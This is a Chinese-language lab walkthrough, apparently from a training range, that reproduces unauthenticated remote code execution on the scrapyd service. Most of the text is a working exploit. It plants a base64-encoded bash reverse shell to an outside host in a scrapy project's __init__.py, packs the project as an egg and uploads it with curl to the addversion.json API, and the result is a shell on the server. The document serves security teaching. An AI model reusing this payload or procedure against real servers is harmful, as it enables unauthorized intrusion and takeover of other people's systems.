# scrapyd 未授权RCE漏洞

> [English Documentation](README_EN.md)

| 属性 | 详情 |
|------|------|
| **漏洞名称** | scrapyd 未授权RCE漏洞 |
| **影响组件** | scrapyd |
| **漏洞类型** | 未授权远程代码执行 |
| **危险等级** | 🔴 高危 |
| **默认端口** | 6800 |

---

## 漏洞概述

`scrapyd` 是爬虫框架 `scrapy` 提供的云服务，用户可以部署自己的 `scrapy` 包到云服务，默认监听在 `6800` 端口。如果攻击者能访问该端口，将可以部署恶意代码到服务器，进而获取服务器权限。

---

## 漏洞复现

靶机启动后，访问 `http://your-ip:6800` 即可看到 `scrapyd` 服务的 `Web` 界面：

![scrapyd Web界面](https://static.nextcyber.cn/attachments/images/course/task/8add67b11ada4c489424b3e603884722.png)

---

## 漏洞利用

首先我们构造一个恶意的 `scrapy` 包：

```bash
pip install scrapy scrapyd-client
scrapy startproject evil
cd evil
```

```bash
┌──(root㉿nextcyber)-[~]
└─# scrapy startproject evil
New Scrapy project 'evil', using template directory '/usr/local/lib/python3.11/dist-packages/scrapy/templates/project', created in:
    /root/evil

You can start your first spider with:
    cd evil
    scrapy genspider example example.com                                                                                                                          
┌──(root㉿nextcyber)-[~]
└─# ls
evil
                   
┌──(root㉿nextcyber)-[~]
└─# cd evil           
                 
┌──(root㉿nextcyber)-[~/evil]
└─# cd evil 
                                                                                                 
┌──(root㉿nextcyber)-[~/evil/evil]
└─# ls
__init__.py  __pycache__  items.py  middlewares.py  pipelines.py  settings.py  spiders
```

编辑 `__init__.py`, 加入恶意代码：

```bash
bash -i >& /dev/tcp/192.168.2.6/1234 0>&1

# base64编码

YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=
```

```python
import os

os.system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE= | base64 -d | bash')
```

进行部署，将 `Scrapy` 项目打包成一个 `Egg` 文件（`.egg` 文件），并将其命名为 `evil.egg`：

```bash
┌──(root㉿nextcyber)-[~/evil/evil]
└─# vim __init__.py 
                                                                                                  
┌──(root㉿nextcyber)-[~/evil/evil]
└─# cat __init__.py 
import os

os.system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE= | base64 -d | bash')

┌──(root㉿nextcyber)-[~/evil/evil]
└─# cd ..                                                                                        
                                                                  
┌──(root㉿nextcyber)-[~/evil]
└─# ls
evil  scrapy.cfg

┌──(root㉿nextcyber)-[~/evil]
└─# scrapyd-deploy --build-egg=evil.egg
Writing egg to evil.egg

┌──(root㉿nextcyber)-[~/evil]
└─# ls
build  evil  evil.egg  project.egg-info  scrapy.cfg  setup.py
```

本地监听端口 `1234`，然后向 `API` 接口发送恶意包：

```bash
curl http://192.168.2.73:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
```

![漏洞利用](https://static.nextcyber.cn/attachments/images/course/task/b12650f76ffb446d80fcff49bb4317fb.png)

漏洞利用成功，拿到了 `nobody` 用户的 `shell`。

---

## 靶场练习

前往 [NextCyber 靶场](https://app.nextcyber.cn/courses/146) 在线实战演练上述漏洞。

---

> ⚠️ **免责声明**：本目录所有内容仅供学习研究使用，请勿用于非法用途。